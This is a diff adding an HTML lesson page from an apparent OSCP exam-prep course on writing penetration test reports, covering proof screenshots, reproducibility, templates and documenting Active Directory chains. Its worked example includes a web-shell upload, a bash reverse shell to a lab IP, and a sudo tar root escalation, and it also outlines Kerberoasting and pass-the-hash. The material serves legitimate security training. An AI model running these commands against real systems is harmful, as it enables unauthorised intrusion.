@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Lesson 15 · Writing the Penetration Test Report</title>
+<link rel="stylesheet" href="../assets/lesson.css">
+</head>
+<body>
+
+<nav class="crumbs">OSCP Course · <a href="../reference/links.html">Links</a> · <a href="./0014-post-exploitation-looting.html">Lesson 14</a> · <strong>Lesson 15</strong> · <a href="../reference/report-writing.html">Report writing</a> · <a href="../reference/glossary.html">Glossary</a></nav>
+
+<span class="kicker">Lesson 15 · Reporting</span>
+<h1>Writing the Penetration Test Report</h1>
+<p class="meta">Mission: pass the OSCP+ exam · Your win today: turn a rooted box into report sections that actually earn the points.</p>
+
+<p class="lead">Here is the part nobody wants to hear: the exam isn't graded on what you hacked — it's graded on what you can <em>prove</em> you hacked. Rooting all four targets and then writing a vague, unreproducible report is one of the most common ways people fail with a "passing" score sitting in their hands. As an engineer this should feel familiar: the report is a <strong>reproducible bug report</strong> — a runbook a grader has to be able to replay step for step. This lesson turns your loot pile into sections that bank the points.</p>
+
+<div class="box mantra">
+If it isn't in the report,<br>
+it didn't happen.
+</div>
+
+<h2>The exam reality: the second 24 hours</h2>
+<p>OSCP+ is two windows, not one. You get roughly <strong>24 hours of hands-on</strong> against the lab, and then a <strong>separate ~24-hour window</strong> to write and submit the report. People treat the report window as a formality. It is not — it is where points are won and lost. The grader reads your PDF; they do not watch your screen.</p>
+<p>The mechanics matter, so internalise them before exam day:</p>
+<ul>
+<li>You write the report locally, then <strong>export it to PDF</strong>.</li>
+<li>You compress the PDF into a <strong>.7z archive</strong> and upload it (there is a <strong>200&nbsp;MB</strong> limit — keep screenshots reasonable).</li>
+<li>Every script, exploit, or PoC you used must appear <strong>as selectable text inside the PDF</strong> — not only as a screenshot. A grader has to be able to copy your code out and read it.</li>
+<li>Results land in roughly <strong>10 business days</strong>. There is no resubmission for a sloppy report — you get one shot per attempt.</li>
+</ul>
+<p>The scoring is unforgiving in a specific way: you only earn the points for a machine if its compromise is <em>documented and reproducible</em>. A working shell with no proof, or a privesc you can't explain, is worth the same as never touching the box. (See <a href="../reference/exam-format.html">exam format</a> for the full point breakdown.)</p>
+
+<div class="box note">
+<span class="box-title">Why "as text" matters</span>
+Screenshots of code aren't searchable, aren't copy-pasteable, and look different at every zoom level. The grader needs to replay your exploit; pasting a 200-line screenshot of Python helps no one. Paste the code as text, and use a screenshot to prove it <em>ran</em>.
+</div>
+
+<h2>Capture as you go — the habit that saves you</h2>
+<p>The single biggest reporting mistake is leaving documentation until after the hands-on. By hour 22, exhausted, you will not remember the exact URL-encoded payload that popped the upload filter, or which of six creds finally worked on the DC. <strong>Capture during, write up after.</strong> The data has to already exist when you sit down to write.</p>
+<p>Build a tiny capture rig before the exam and rehearse using it:</p>
+<table>
+<thead><tr><th>Tool class</th><th>Pick</th><th>What it buys you</th></tr></thead>
+<tbody>
+<tr><td><strong>Notes app</strong></td><td>Obsidian / CherryTree / Sublime</td><td>One markdown page per host; paste commands the instant they work</td></tr>
+<tr><td><strong>Screenshots</strong></td><td>flameshot (Linux)</td><td>Fast region grab + annotate; bind it to <kbd>PrtSc</kbd></td></tr>
+<tr><td><strong>Terminal log</strong></td><td><code>script</code>, <code>tmux</code> capture, or asciinema</td><td>A full transcript of every command and its output — your safety net</td></tr>
+</tbody>
+</table>
+<p>Start your shell logging before you touch a target, so nothing is lost:</p>
+<pre><span class="p">$</span> <span class="o">script -q ~/oscp/standalone1/terminal.log</span>   <span class="c"># logs everything until you `exit`</span>
+<span class="p">$</span> <span class="o">tmux new -s oscp \; pipe-pane -o 'cat &gt;&gt; ~/oscp/tmux.log'</span>  <span class="c"># or capture a pane</span></pre>
+<p>Keep a <strong>per-host folder</strong> — scans, screenshots, loot, notes all in one place. When you write the report, each folder becomes one machine section, in order. You're not writing; you're transcribing.</p>
+
+<pre><span class="o">~/oscp/</span>
+<span class="o">├── standalone1/   nmap/  screenshots/  loot/  notes.md  local.txt  proof.txt</span>
+<span class="o">├── standalone2/   ...</span>
+<span class="o">├── standalone3/   ...</span>
+<span class="o">└── ad/   ms01/  dc01/  ws02/  creds.md  bloodhound.zip</span></pre>
+
+<div class="box tip">
+<span class="box-title">Screenshot the moment, not the memory</span>
+The instant a flag is on screen, grab it — flag, <code>ip a</code>, and <code>whoami</code> in the <em>same frame</em>. Re-staging that screenshot at hour 23 (or after you've lost the shell) is how people end up with a rooted box and no provable proof.
+</div>
+
+<h2>Report structure: front matter, then per machine</h2>
+<p>Don't invent a layout under time pressure. The accepted shape — and the one the official template gives you — is front matter, then one self-contained section per machine, then remediation. Think of it as: <em>here's the engagement, here's exactly how I broke each box, here's how you'd fix it.</em></p>
+
+<ol class="steps">
+<li><strong>Executive summary</strong> — a short, high-level "what I was asked to do and what I found", written so a non-technical reader gets it. A few sentences: scope, that you achieved X compromises, overall posture.</li>
+<li><strong>Methodology overview</strong> — your repeatable workflow in brief: enumerate → identify → exploit → escalate → loot → pivot. This frames everything that follows.</li>
+<li><strong>Per machine</strong> (repeat for each standalone) —
+  <ul>
+  <li><strong>Enumeration</strong> — the <code>nmap</code> output and the key findings that mattered.</li>
+  <li><strong>Foothold</strong> — exact reproducible steps, the precise commands/payloads, screenshots, and the <code>local.txt</code> value.</li>
+  <li><strong>Privilege escalation</strong> — exact steps to root/SYSTEM, with the <code>proof.txt</code> value.</li>
+  </ul>
+</li>
+<li><strong>Active Directory set</strong> — the full chain, <em>host by host</em>, making the <strong>credential path</strong> explicit: how each cred was obtained on one host and reused to reach the next, all the way to Domain Admin.</li>
+<li><strong>Remediation</strong> — short, concrete fixes per finding (patch X, remove the SUID bit, rotate the leaked cred, disable unconstrained delegation).</li>
+</ol>
+
+<p>Each machine section must stand alone. A grader scoring Standalone&nbsp;#2 should never have to scroll back into #1 to understand it. Self-contained sections are how partial credit gets awarded cleanly.</p>
+
+<h3>What the executive summary should sound like</h3>
+<p>Engineers tend to either skip the summary or fill it with jargon. It's neither. Write a few plain sentences a manager could read — scope, outcome, posture — then let the technical sections carry the detail:</p>
+<div class="box note">
+<span class="box-title">Example executive summary</span>
+"OffSec engaged the tester to perform a penetration test against the exam network. The tester was able to compromise all in-scope hosts, obtaining administrative (root / SYSTEM) access on each standalone target and full Domain Admin control of the Active Directory environment. The compromises stemmed from missing input validation, weak service-account credentials, and excessive privileges; specific findings and remediation appear in the sections below."
+</div>
+<p>That's the whole job: state what you were asked to do and what you achieved, in language that needs no shell to understand. The proof lives downstream.</p>
+
+<div class="box warn">
+<span class="box-title">Proof requirements — get this exactly right</span>
+Every compromise needs a screenshot that, <strong>in a single frame</strong>, shows: (1) the flag contents, (2) the machine's IP from <code>ip a</code> / <code>ipconfig</code>, and (3) <code>whoami</code> / <code>hostname</code>. <strong>And</strong> paste the flag value as text alongside it. A flag with no IP, or an IP in a separate screenshot, is ambiguous proof — and ambiguous proof is <em>lost</em> proof, even if you genuinely rooted the box. Don't argue the points away on a technicality.</div>
+
+<h2>The reproducibility standard</h2>
+<p>This is the bar, stated plainly: <strong>someone who has never seen the box must be able to replay your compromise from the report alone.</strong> Not "understand roughly what you did" — actually do it again. Apply the same test you'd apply to a bug ticket that says "sometimes login breaks": useless. The grader is QA trying to reproduce your finding.</p>
+<p>Concretely, that means you include:</p>
+<table>
+<thead><tr><th>Include</th><th>Not</th></tr></thead>
+<tbody>
+<tr><td>The exact URL, including path and params</td><td>"the upload page"</td></tr>
+<tr><td>The exact payload, copy-pasteable</td><td>"a malicious file"</td></tr>
+<tr><td>The full command with all flags and the target IP</td><td>"I ran the exploit"</td></tr>
+<tr><td>Exact file paths written to / read</td><td>"a writable directory"</td></tr>
+<tr><td>The exploit code as text, with the lines you changed called out</td><td>a cropped screenshot of an editor</td></tr>
+</tbody>
+</table>
+<p>If you edited a public exploit — fixed the target IP, the LPORT, the return address — say so and show the changed lines. <strong>Redact nothing that's needed to reproduce.</strong> Passwords you found, internal IPs, payload contents: they all belong in the report, because the grader needs them to replay your path. This is a lab, not a real client engagement — full transparency is the goal.</p>
+
+<h2>Templates and workflow: pick ONE, pre-fill it</h2>
+<p>You do not write the report from a blank page. Choose a template before the exam, fill in the boilerplate (your name, OSID, headings, the standard intro text), and save it ready to go. Three are widely used:</p>
+<table>
+<thead><tr><th>Template</th><th>Format</th><th>Why pick it</th></tr></thead>
+<tbody>
+<tr><td><strong>Official OffSec template</strong></td><td>Word / docx</td><td>The baseline; guaranteed to match what graders expect</td></tr>
+<tr><td><strong>noraj's template</strong></td><td>Markdown → PDF</td><td>Write in Markdown, build to a clean PDF; great if you live in a text editor</td></tr>
+<tr><td><strong>whoisflynn's template</strong></td><td>Word</td><td>Popular community variant with a pre-built structure and examples</td></tr>
+</tbody>
+</table>
+<p>If you go Markdown, settle the toolchain in advance — typically <strong>pandoc</strong> (or the template's own build script) turning your <code>.md</code> into a PDF:</p>
+<pre><span class="p">$</span> <span class="o">pandoc report.md -o OSCP-OS-XXXXX-Exam-Report.pdf \</span>
+<span class="o">    --from markdown --template eisvogel --listings -V colorlinks</span>
+<span class="p">$</span> <span class="o">7z a OSCP-OS-XXXXX-Exam-Report.7z OSCP-OS-XXXXX-Exam-Report.pdf</span>  <span class="c"># archive to upload</span></pre>
+<p>Whichever you choose, <strong>do a dry run before the exam</strong>: build the PDF, open it, confirm code blocks render as selectable text and images aren't blurry. Discovering your pandoc template is broken during the report window is a self-inflicted wound.</p>
+
+<h2>Common failure modes</h2>
+<p>Almost every avoidable point loss is on this list. Read it as a pre-flight checklist:</p>
+<table>
+<thead><tr><th>Failure</th><th>Cost</th><th>Fix</th></tr></thead>
+<tbody>
+<tr><td>Rooted but no proof screenshot</td><td>Zero credit for that machine</td><td>Screenshot the flag the moment you see it</td></tr>
+<tr><td>Steps aren't reproducible</td><td>Grader can't replay → no credit</td><td>Record exact commands/URLs/payloads as you go</td></tr>
+<tr><td>IP / <code>whoami</code> not in the frame</td><td>Ambiguous proof → lost points</td><td>One frame: flag + <code>ip a</code> + <code>whoami</code></td></tr>
+<tr><td>Exploit code omitted (or image-only)</td><td>Reproducibility broken</td><td>Paste full code as text, note your edits</td></tr>
+<tr><td>AD chain described vaguely</td><td>Partial/zero AD credit (40 pts)</td><td>Document host-by-host with the credential path</td></tr>
+<tr><td>Relying on memory</td><td>Wrong/missing details under fatigue</td><td>Capture during the hands-on, not after</td></tr>
+</tbody>
+</table>
+
+<h2>Worked example — what "good" looks like</h2>
+<p>Here is a compact model section for <strong>Standalone&nbsp;#1</strong>. Notice the rhythm: state the finding, show the exact command, show the proof, paste the flag as text. Nothing requires you to have been there.</p>
+
+<h3>Standalone #1 — 10.10.10.5</h3>
+<p><strong>Enumeration.</strong> A full TCP scan showed SSH and an Apache instance:</p>
+<pre><span class="p">$</span> <span class="o">nmap -sC -sV -p- -oN nmap/full.txt 10.10.10.5</span>
+<span class="o">PORT   STATE SERVICE VERSION</span>
+<span class="o">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu</span>
+<span class="o">80/tcp open  http    Apache httpd 2.4.41</span>
+<span class="o">|_http-title: Acme Uploads</span></pre>
+<p>Directory brute-forcing revealed an unauthenticated upload endpoint at <code>http://10.10.10.5/upload.php</code> with no extension filtering.</p>
+
+<p><strong>Foothold.</strong> I uploaded a PHP web shell and triggered it to get a reverse shell as <code>www-data</code>:</p>
+<pre><span class="p">$</span> <span class="o">curl -F 'file=@shell.php' http://10.10.10.5/upload.php</span>
+<span class="p">$</span> <span class="o">curl 'http://10.10.10.5/uploads/shell.php?cmd=bash+-c+"bash+-i+&gt;%26+/dev/tcp/10.10.14.5/443+0&gt;%261"'</span>
+<span class="c"># on the listener (nc -lvnp 443): shell as www-data</span>
+<span class="p">$</span> <span class="o">cat /home/acme/local.txt</span>
+<span class="h">a1b2c3d4e5f60718293a4b5c6d7e8f90</span></pre>
+<p class="cite">[screenshot: reverse shell as www-data, output of <code>ip a</code> showing 10.10.10.5, <code>whoami</code>, and local.txt in one frame]</p>
+<p><code>local.txt</code> = <code>a1b2c3d4e5f60718293a4b5c6d7e8f90</code></p>
+
+<p><strong>Privilege escalation.</strong> <code>sudo -l</code> showed <code>www-data</code> could run <code>/usr/bin/tar</code> as root with no password. Per <a href="https://gtfobins.github.io/gtfobins/tar/">GTFOBins → tar</a>, that yields a root shell:</p>
+<pre><span class="p">$</span> <span class="o">sudo -l</span>
+<span class="o">    (root) NOPASSWD: /usr/bin/tar</span>
+<span class="p">$</span> <span class="o">sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</span>
+<span class="p">#</span> <span class="o">id</span>
+<span class="h">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="p">#</span> <span class="o">cat /root/proof.txt</span>
+<span class="h">f9e8d7c6b5a40312f1e0d9c8b7a60504</span></pre>
+<p class="cite">[screenshot: <code>id</code> showing uid=0(root), <code>hostname</code>, <code>ip a</code> showing 10.10.10.5, and proof.txt in one frame]</p>
+<p><code>proof.txt</code> = <code>f9e8d7c6b5a40312f1e0d9c8b7a60504</code></p>
+<p><strong>Remediation.</strong> Remove the <code>NOPASSWD</code> sudo entry for <code>tar</code>; add server-side extension and content-type validation on <code>upload.php</code> and store uploads outside the web root.</p>
+<p>That's the whole box: foothold (10 pts) and privesc (10 pts), both reproducible, both proven. Twenty points, banked — and the AD set follows the same pattern, just chained across hosts.</p>
+
+<h2>Documenting the AD chain — host by host</h2>
+<p>The Active Directory set is worth <strong>40 points</strong> and it's the part most people document worst. The trap is summarising: "I compromised the domain via Kerberoasting and lateral movement." That tells the grader nothing they can replay. The fix is to treat the chain as a sequence of <em>linked</em> machine sections, where the output of each step is the input of the next — and the link is almost always a <strong>credential</strong>.</p>
+<p>Make the credential path the spine of the narrative. For every hop, answer three questions: where did this access come from, what did I obtain here, and where does it let me go next?</p>
+<ol class="steps">
+<li><strong>MS01 (10.10.10.20) — initial foothold.</strong> Exploited the web app → shell as a low-priv user. Looted a service-account password from a config file: <code>svc_web : Summer2024!</code>.</li>
+<li><strong>MS01 → enumeration with creds.</strong> Ran BloodHound as <code>svc_web</code>; it showed the account is Kerberoastable and that <code>svc_sql</code> has a path to DC01. Cracked the SQL SPN hash offline → <code>svc_sql : P@ssw0rd123</code>.</li>
+<li><strong>WS02 (10.10.10.21) — lateral move.</strong> <code>svc_sql</code> is a local admin on WS02. Used <code>impacket-psexec</code> with those creds to get SYSTEM, then dumped LSASS → recovered a Domain Admin hash for <code>Administrator</code>.</li>
+<li><strong>DC01 (10.10.10.10) — domain compromise.</strong> Pass-the-hash with the DA hash via <code>impacket-psexec</code> → SYSTEM on the DC. Captured <code>proof.txt</code>.</li>
+</ol>
+<p>Each numbered hop gets its own full write-up in the report — exact commands, the cred used, and a proof screenshot — exactly like the standalone above. Show the command that <em>obtained</em> each credential and the command that <em>reused</em> it. Done this way, a grader can walk MS01 → WS02 → DC01 with nothing but your PDF. Done vaguely, you risk most of those 40 points even if you genuinely owned the domain.</p>
+
+<div class="box note">
+<span class="box-title">Keep a running creds table</span>
+A single table of <em>username · password/hash · source host · where it works</em> — updated live during the hands-on — is the most valuable artifact for the AD write-up. It <em>is</em> your credential path; you mostly just transcribe it into prose.
+</div>
+
+<h2>Before you hit submit</h2>
+<p>The last twenty minutes are where tired people throw away a pass. Run this final pass deliberately — treat it like a release checklist, not a glance:</p>
+<ol class="steps">
+<li><strong>Every claimed machine has a proof screenshot</strong> — flag + IP + <code>whoami</code> in one frame — and the flag value pasted as text.</li>
+<li><strong>Every exploit/PoC is present as selectable text</strong> in the PDF, with any edited lines noted. Open the PDF and try to <em>select</em> a code block.</li>
+<li><strong>Each section reproduces</strong> — skim it as a stranger: could you replay it with no extra knowledge? If a step says "then I exploited it", fix it.</li>
+<li><strong>The PDF actually built cleanly</strong> — no broken images, no overflowing code, headings intact.</li>
+<li><strong>Filename and metadata</strong> match what the guide asks (your OSID), then archive to <strong>.7z</strong> and confirm it's under <strong>200&nbsp;MB</strong>.</li>
+<li><strong>Upload and verify</strong> the submission went through before your window closes. Don't leave it to the final minute.</li>
+</ol>
+<p>Notice the symmetry with the rest of the course: enumeration is methodical, exploitation is methodical, and so is this. The report isn't a different skill — it's the same discipline pointed at proving your work. Get it right and the points you earned in the lab are the points you keep.</p>
+
+<h2>Check yourself</h2>
+<p>Retrieve before you reason — feedback appears under each.</p>
+<div class="quiz" id="quiz"></div>
+
+<div class="primary">
+<span class="box-title">▶ Primary source — read the reporting section, then grab the template</span>
+The <a href="https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide">OffSec OSCP+ Exam Guide</a> is authoritative on submission mechanics and proof requirements — read its reporting section and download the official template. Then look at <a href="https://github.com/noraj/OSCP-Exam-Report-Template-Markdown">noraj's Markdown template</a> if you prefer a text-editor → PDF workflow.<sup class="ref"><a href="#s1">1</a></sup>
+</div>
+
+<div class="box tip">
+<span class="box-title">Do this before Lesson 16</span>
+Take a box you've already rooted (any from the course so far) and write a <em>full</em> report section for it using a template you choose now — official, noraj, or whoisflynn. Include proper proof screenshots (flag + IP + <code>whoami</code> in one frame) and the exact reproducible steps. Build it to PDF and confirm your code blocks are selectable text. Do this once now and the exam report stops being scary.
+</div>
+
+<div class="box note">
+<span class="box-title">Practice these boxes</span>
+<strong>No new box</strong> — pick one you have already rooted and write it up to exam standard (every command, screenshot, proof file). Run it through <code>/box-notes</code>. <a href="../reference/practice-boxes.html#pb-15">→ Full box map for this lesson</a>.
+</div>
+
+<div class="teacher">
+<span class="box-title">I'm your teacher — ask me anything</span>
+Paste me a draft report section and I'll grade it the way an examiner would — telling you exactly where the proof is ambiguous or a step isn't reproducible. Next: <strong>Lesson 16 — Exam Strategy &amp; Time Management</strong> — how to budget the 24 hours so you actually reach the report stage with points on the board.
+</div>
+
+<h2>Sources</h2>
+<ol class="sources">
+<li id="s1"><a href="https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide">OffSec — OSCP+ Exam Guide</a> (reporting requirements, submission format, official template) · <a href="https://github.com/noraj/OSCP-Exam-Report-Template-Markdown">noraj — OSCP Exam Report Template (Markdown)</a> (Markdown → PDF workflow). Local commands: <a href="../reference/report-writing.html">Report writing cheatsheet</a>.</li>
+</ol>
+
+<footer>
+<span><a href="./0014-post-exploitation-looting.html">← Lesson 14: Post-Exploitation: Looting &amp; Credential Harvesting</a></span>
+<span><a href="./0016-exam-strategy.html">Next → Lesson 16: Exam Strategy &amp; Time Management</a></span>
+</footer>
+
+<script src="../assets/quiz.js"></script>
+<script>
+renderQuiz('quiz', [
+  {
+    prompt: "You rooted all four targets but your report is vague and hard to follow. What's the realistic outcome?",
+    options: ["You can fail despite the shells, because unprovable compromises earn nothing", "You pass automatically since you got root on everything", "The grader watches your recording to confirm the roots", "You get a resubmission window to clean it up"],
+    answer: 0,
+    explain: "The report is graded; a compromise you can't document reproducibly earns the same as never touching the box."
+  },
+  {
+    prompt: "When should you capture screenshots and copy the exact commands?",
+    options: ["After the 24 hours, from memory", "Only for the machines you fully root", "During the hands-on, the moment each step works", "During the report window, by re-running everything"],
+    answer: 2,
+    explain: "By hour 22 you won't recall the exact payload — capture as you go so the data already exists when you write."
+  },
+  {
+    prompt: "What must a proof screenshot show, all in one frame, to count?",
+    options: ["Just the flag contents", "The flag, the machine's IP, and whoami/hostname", "The flag and the time of day", "The exploit code and the flag"],
+    answer: 1,
+    explain: "Flag + ip a/ipconfig + whoami in the same frame removes ambiguity; a flag alone is contestable and loses points."
+  },
+  {
+    prompt: "How must your exploit scripts and PoCs appear in the submitted PDF?",
+    options: ["As screenshots of your editor only", "As external links to GitHub", "Omitted to stay under the size limit", "As selectable text the grader can copy out"],
+    answer: 3,
+    explain: "Code must be pasted as text so it's searchable and reproducible; a screenshot proves it ran, the text lets it be replayed."
+  },
+  {
+    prompt: "What's the smartest move regarding the report template before exam day?",
+    options: ["Pick one template now and pre-fill the boilerplate", "Write from a blank document during the report window", "Use a different template for each machine", "Decide on a template after the hands-on ends"],
+    answer: 0,
+    explain: "Choosing and pre-filling one template (official, noraj, or whoisflynn) removes setup friction when you're tired."
+  },
+  {
+    prompt: "How should the Active Directory set be documented to earn the 40 points?",
+    options: ["As one summary paragraph for the whole domain", "Only the final Domain Admin screenshot", "Host by host, making the credential path between machines explicit", "A BloodHound graph image with no steps"],
+    answer: 2,
+    explain: "The grader must replay the chain: how each cred was obtained on one host and reused to reach the next, up to DA."
+  }
+]);
+</script>
+
+</body>
+</html>
